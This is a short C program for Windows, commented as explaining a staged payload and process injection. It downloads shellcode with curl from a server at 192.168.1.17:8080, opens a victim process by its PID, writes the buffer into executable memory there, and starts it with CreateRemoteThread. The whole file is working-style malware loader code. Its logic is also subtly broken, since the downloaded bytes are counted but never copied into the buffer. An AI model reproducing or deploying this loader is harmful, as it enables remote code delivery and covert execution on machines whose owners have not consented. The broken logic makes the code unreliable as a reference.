#include <stdio.h>
#include <windows.h>

int main(int argc,char *argv[]){	
	
	//this code snippet explains a staged payload.
	
	FILE *fpipe;
	char *cmd = "curl --silent http://192.168.1.17:8080/code.bin"; // change to desired server ip and port number
	char c=0;
	unsigned char shellcode[510]; //you have to specify shellcode size 
	int counter=0;
	
	//execute the curl cmd and pipe the result to fpipe descriptor
	
	if( (fpipe=(FILE*)(_popen(cmd,"r"))) == NULL ){
		perror("[x] popen() failed..\n");
		exit(EXIT_FAILURE);
	}
	
	while(fread(&c,sizeof(c),1,fpipe)){
		//debug
		//printf("%c",c);
		//end debug
		counter=counter + 1;
	}
	printf("\n[+] shellcode size %d bytes\n",counter);
	shellcode[counter];

	//debug
	/*
	for(int i=0; i < sizeof(shellcode); ++i){
		printf("%c",shellcode[i]);
	}
	system("pause");
	*/
	//end debug
	
	
	//this code snippet explains how process injection works
	DWORD PID;
	HANDLE hProcess;
	HANDLE hThread;
	HANDLE hVictimThread;
	void *exec_mem;

	PID=atoi(argv[1]);
	printf("[+] trying to open a handle to process (%ld)\n",PID);
	hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,PID);
	if(hProcess==NULL){
		printf("[x] Failed to get handle to process,error (%ld)\n",GetLastError());
		exit(1);
	}
	printf("[+] GOT HANDLE TO VICTIM PROCESS!\n");	
	exec_mem=VirtualAllocEx(hProcess,NULL,sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);	
	WriteProcessMemory(hProcess,exec_mem,shellcode,sizeof(shellcode),NULL);
	printf("[+] trying to open a remote thread (%ld)\n",PID);
	hThread=CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE) exec_mem,NULL,0,0);
	if(hThread==NULL){
		printf("[x] Failed to get handle to process,error (%ld)\n",GetLastError());
		CloseHandle(hProcess);
		exit(1);
	}
	printf("[+] GOT HANDLE TO THREAD!\n");
	WaitForSingleObject(hThread, INFINITE);
	printf("[+] cleaning up..\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return 0;
}
